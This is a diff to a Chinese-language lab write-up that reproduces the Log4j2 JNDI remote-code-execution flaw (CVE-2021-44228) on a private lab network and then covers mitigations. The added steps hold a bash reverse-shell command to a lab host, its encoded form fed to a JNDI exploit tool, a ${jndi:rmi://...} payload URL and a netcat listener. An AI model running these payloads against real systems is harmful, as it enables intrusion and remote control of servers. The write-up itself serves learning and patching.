@@ -628,22 +628,37 @@
 
   (maven通过`sudo apt install maven`安装)
 
+  在kali中打开事先准备好的exp，地址`https://github.com/bkfish/Apache-Log4j-Learning/`
+
+  解压后到tool目录下，构造payload
+  >bash -i >& /dev/tcp/192.168.56.104/7777 0>&1
+  
+  将这行代码通过base64进行加密，得到
+  >YmFzaCUyMC1pJTIwJTNFJTI2JTIwL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvNzc3NyUyMDAlM0UlMjYx
+
   通过查询.jar文件在target文件夹中
 
   启动运行：
   ```
-  java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "{echo,28d9a54922100538d85b6939e5dce33f23646c7948f666ab7f2b7eaffd2bee76}|{base64,-d}|{bash,-i}" -A 192.168.56.104
+  java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo, YmFzaCUyMC1pJTIwJTNFJTI2JTIwL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvNzc3NyUyMDAlM0UlMjYx}|{base64,-d}|{bash,-i}" -A 192.168.56.104
 
   ```
 
 
   java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “反弹shell命令” -A “该IP是开启JDNI服务的主机地址”
 
-  ![JDNI_link](pic/JDNI-link.png)
+  ![JDNI_link](pic/JNDI.png)
 
   得到rmi、ldap参数
 
+  这里会生成两个协议各一个执行命令，这两个协议在log4j2中都有执行权限
+
+  我们使用第一个，再次构造一个payload
+
+  >${jndi:rmi://192.168.56.104:1099/374ohk}
+
   对应端口开启监听
+  >nc -lvvp 7777
 
   浏览器端访问payload
 
@@ -671,6 +686,8 @@
   [JNDIExploit](https://github.com/WhiteHSBG/JNDIExploit)
 
   [Mr-xn/JNDIExploit-1](https://github.com/Mr-xn/JNDIExploit-1)
+
+  [log4j2（CVE-2021-44228）漏洞复现实操（小白向）](https://cloud.tencent.com/developer/article/2023496)
 
 - 漏洞利用流量监测实战
   
@@ -772,45 +789,42 @@
         (demo.jar为实际的应用程序jar文件)
 
     3. 将系统环境变量 `FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS` 设置为 true
+      
+        >export FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true
+
+        或者将该命令添加到`~/.bashrc`或`~/.bash_profile`
+
+
+    4. 移除log4j-core包中的JndiLookup类文件
+        >zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+
+
+        http://192.168.56.108:11779/hello?payload=${jndi:rmi://192.168.56.104:1099/2lmgt3}
+
+    实验可以看到，日志记录中有访问记录，但是页面打开报错
+    ![1](pic/1.png)
+
+- 通过版本覆盖，将项目依赖的log4j2升级到最新版本
+
+- 接入安全产品
+  WAF规则、RASP拦截等措施
+
+
+- 参考资料
   
-    三种方式也可以同时实施，以确保安全
+  [Log4j2远程代码执行漏洞(cve-2021-44228)复现](https://blog.csdn.net/weixin_46198176/article/details/124917641)
 
-- 源码级修复方案
-  
-  
-        
+  [Log4j2漏洞修复](https://blog.csdn.net/derstsea/article/details/121918902)
 
+  [log4j官方漏洞修复史(更新至2.17.1/CVE-2021-44832)](https://blog.csdn.net/qsort_/article/details/122101423)
 
+  [APACHE LOG4J远程代码执行漏洞（ CVE-2021-44228）完整处置手册](http://blog.nsfocus.net/apache-log4j-cve-2021-44228/)
 
-
-
+  [log4j2漏洞原理分析及复现-CVE-2021-44228 （vulfocus靶场）](https://blog.csdn.net/yang1234567898/article/details/124255931)
 
 
 
   
 
-
-
-  
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-
-
-
-1. 漏洞利用监测
-2. 漏洞利用防御与加固
 
 
